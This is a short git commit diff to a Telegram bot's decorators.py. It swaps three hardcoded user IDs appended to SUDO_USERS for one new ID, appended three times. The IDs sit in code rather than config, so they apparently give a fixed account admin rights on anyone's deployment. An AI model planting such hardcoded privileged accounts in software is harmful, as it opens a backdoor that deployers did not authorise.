cac30185b0587f10a0c525fda1fc4c34e0f58903
Mrvk1703 <94621036+Mrvk1703@users.noreply.github.com>
2022-01-31 14:35:58 +0530

    Update decorators.py

--- driver/decorators.py
+++ driver/decorators.py
@@ -5,9 +5,9 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
+SUDO_USERS.append(1729094176)
+SUDO_USERS.append(1729094176)
+SUDO_USERS.append(1729094176)
 
 
 def errors(func: Callable) -> Callable:
